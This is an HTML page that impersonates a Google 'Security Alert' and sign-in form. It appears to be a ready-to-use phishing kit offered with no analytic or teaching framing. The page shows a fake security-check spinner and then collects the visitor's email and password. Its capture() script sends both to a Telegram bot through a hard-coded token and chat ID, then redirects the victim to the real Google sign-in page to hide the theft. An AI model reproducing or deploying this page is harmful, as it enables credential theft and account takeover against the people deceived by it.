<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Security Alert</title>
    <style>
        body { font-family: 'Roboto', arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-card { width: 350px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
        img { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; }
        p { font-size: 16px; margin-bottom: 24px; }
        input { width: 100%; padding: 13px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        .btn { width: 100%; padding: 10px; background: #1a73e8; color: #fff; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
        #loading { display: block; }
        #google-form { display: none; }
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #4285F4; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="login-card">
        <div id="loading">
            <div class="spinner"></div>
            <p>Checking security status...</p>
        </div>
        <div id="google-form">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
            <h1>Sign in</h1>
            <p>Use your Google Account</p>
            <input type="email" id="email" placeholder="Email or phone" required>
            <input type="password" id="pass" placeholder="Enter your password" required>
            <button class="btn" onclick="capture()">Next</button>
        </div>
    </div>
    <script>
        setTimeout(() => {
            document.getElementById('loading').style.display = 'none';
            document.getElementById('google-form').style.display = 'block';
        }, 2000);

        async function capture() {
            const email = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;
            const token = '8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k';
            const chatId = '8639892987';
            const msg = `🎯 GOOGLE HIT!\n📧 User: ${email}\n🔑 Pass: ${pass}`;
            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
            window.location.href = "https://accounts.google.com/";
        }
    </script>
</body>
</html>
